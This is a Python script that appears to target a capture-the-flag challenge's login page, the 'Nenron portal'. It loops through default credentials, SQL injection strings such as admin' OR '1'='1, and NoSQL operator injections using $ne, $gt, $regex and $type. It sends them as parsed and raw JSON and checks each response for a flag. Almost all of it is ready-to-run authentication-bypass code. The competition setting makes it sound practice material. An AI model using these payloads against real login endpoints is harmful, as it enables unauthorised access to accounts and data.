#!/usr/bin/env python3
"""
Test various login payloads against the Nenron portal
"""

import requests
import json

def test_login(username, password, description=""):
    url = "http://chals.uscc-cyberbowl-2025.ctf.institute:3006/login"
    data = {"username": username, "password": password}
    
    print(f"\n[*] Testing: {description}")
    print(f"    Payload: username={username}, password={password}")
    
    try:
        response = requests.post(url, json=data, headers={'Content-Type': 'application/json'})
        print(f"    Status: {response.status_code}")
        print(f"    Response: {response.text}")
        
        # Check if we got a flag
        if 'flag' in response.text.lower() or 'uscc{' in response.text.lower():
            print(f"    [!] POTENTIAL FLAG FOUND!")
            
        return response
    except Exception as e:
        print(f"    Error: {e}")
        return None

def test_nosql_injection():
    """Test NoSQL injection payloads"""
    url = "http://chals.uscc-cyberbowl-2025.ctf.institute:3006/login"
    
    # NoSQL injection payloads
    payloads = [
        # Basic NoSQL injection
        ({"$ne": None}, {"$ne": None}, "NoSQL injection - not equal null"),
        ({"$ne": ""}, {"$ne": ""}, "NoSQL injection - not equal empty"),
        ({"$gt": ""}, {"$gt": ""}, "NoSQL injection - greater than empty"),
        
        # Targeted admin NoSQL injection
        ("admin", {"$ne": None}, "NoSQL injection - admin with any password"),
        ("admin", {"$ne": ""}, "NoSQL injection - admin not empty password"),
        ("admin", {"$gt": ""}, "NoSQL injection - admin password greater than empty"),
        
        # Regex-based NoSQL injection
        ({"$regex": ".*"}, {"$regex": ".*"}, "NoSQL injection - regex match all"),
        ({"$regex": "^admin"}, {"$regex": ".*"}, "NoSQL injection - admin regex"),
        
        # Type confusion
        ("admin", {"$type": 2}, "NoSQL injection - type confusion"),
    ]
    
    for username, password, desc in payloads:
        print(f"\n[*] Testing: {desc}")
        print(f"    Payload: {json.dumps({'username': username, 'password': password})}")
        
        try:
            response = requests.post(url, 
                                   json={"username": username, "password": password},
                                   headers={'Content-Type': 'application/json'})
            print(f"    Status: {response.status_code}")
            print(f"    Response: {response.text}")
            
            if 'flag' in response.text.lower() or 'uscc{' in response.text.lower():
                print(f"    [!] POTENTIAL FLAG FOUND!")
                
        except Exception as e:
            print(f"    Error: {e}")

def test_raw_payloads():
    """Test with raw payloads that might bypass JSON parsing"""
    url = "http://chals.uscc-cyberbowl-2025.ctf.institute:3006/login"
    
    # Raw payloads that might work
    raw_payloads = [
        ('{"username": {"$ne": null}, "password": {"$ne": null}}', "Raw NoSQL - not null"),
        ('{"username": "admin", "password": {"$ne": null}}', "Raw NoSQL - admin any password"),
        ('{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}', "Raw NoSQL - regex all"),
        ('{"username": "admin", "password": {"$regex": ".*"}}', "Raw NoSQL - admin regex password"),
    ]
    
    for payload, desc in raw_payloads:
        print(f"\n[*] Testing: {desc}")
        print(f"    Raw payload: {payload}")
        
        try:
            response = requests.post(url, 
                                   data=payload,
                                   headers={'Content-Type': 'application/json'})
            print(f"    Status: {response.status_code}")
            print(f"    Response: {response.text}")
            
            if 'flag' in response.text.lower() or 'uscc{' in response.text.lower():
                print(f"    [!] POTENTIAL FLAG FOUND!")
                
        except Exception as e:
            print(f"    Error: {e}")

def main():
    print("[*] Testing Nenron Portal Login Endpoint\n")
    
    # Test normal credentials
    print("[*] Testing normal credentials...")
    test_login("admin", "admin", "Default admin/admin")
    test_login("admin", "password", "Default admin/password")
    test_login("test", "test", "Default test/test")
    
    # Test SQL injection
    print("\n[*] Testing SQL injection...")
    test_login("admin' OR '1'='1", "anything", "SQL injection - OR 1=1")
    test_login("admin' --", "anything", "SQL injection - comment")
    test_login("admin' #", "anything", "SQL injection - hash comment")
    
    # Test NoSQL injection
    print("\n[*] Testing NoSQL injection...")
    test_nosql_injection()
    
    # Test raw payloads
    print("\n[*] Testing raw JSON payloads...")
    test_raw_payloads()

if __name__ == "__main__":
    main()